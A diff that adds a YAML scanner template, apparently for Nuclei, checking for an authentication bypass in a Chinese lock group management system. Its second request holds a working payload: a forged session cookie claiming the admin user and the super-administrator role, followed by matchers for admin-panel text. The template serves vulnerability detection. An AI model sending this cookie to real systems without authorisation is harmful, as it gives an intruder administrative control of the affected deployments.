@@ -1,0 +1,43 @@
+id: poc-yaml-lgms-identity-authentication-bypass
+info:
+  name: 锁群管理系统 身份认证绕过漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+  description: |
+    This template checks for authentication bypass vulnerabilities in 锁群管理系统 (Lock Group Management System).
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "您好！ <span>"
+
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: ASP.NET_SessionId=evadd1jksrepp4gtbgockcbi; username=admin; power=1; powerName=%e8%b6%85%e7%ba%a7%e7%ae%a1%e7%90%86%e5%91%98; code=admin
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "您好！admin [超级管理员] <span>"
+          - "您好！系统管理员 [超级管理员] <span>"
+          - "锁群管理系统"
+          - "员工管理"
